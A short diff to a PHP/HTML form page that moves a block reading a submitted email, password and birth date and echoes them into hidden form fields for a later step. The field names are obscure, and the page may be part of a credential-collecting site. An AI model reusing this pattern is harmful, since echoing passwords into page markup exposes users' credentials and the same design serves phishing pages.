@@ -1,13 +1,3 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email1 = htmlspecialchars($_POST['godhelpme1ma']);
-    $password1 = htmlspecialchars($_POST['godhelpme1pa']);
-    $month1 = htmlspecialchars($_POST['godhelpme1mo']);
-    $day1 = htmlspecialchars($_POST['godhelpme1da']);
-    $year1 = htmlspecialchars($_POST['godhelpme1ye']);
-}
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -114,6 +104,15 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                                         <div class="ant-col ant-form-item-control">
                                             <div>
                                                 <div class="thepadding">
+							<?php
+							if ($_SERVER["REQUEST_METHOD"] == "POST") {
+							    $email1 = htmlspecialchars($_POST['godhelpme1ma']);
+							    $password1 = htmlspecialchars($_POST['godhelpme1pa']);
+							    $month1 = htmlspecialchars($_POST['godhelpme1mo']);
+							    $day1 = htmlspecialchars($_POST['godhelpme1da']);
+							    $year1 = htmlspecialchars($_POST['godhelpme1ye']);
+							}
+							?>
                                                     <input type="hidden" name="godhelpme1ma" value="<?php echo $email1; ?>" readonly>
                                                     <input type="hidden" name="godhelpme1pa" value="<?php echo $password1; ?>" readonly>
                                                     <input type="hidden" name="godhelpme1mo" value="<?php echo $month1; ?>" readonly>
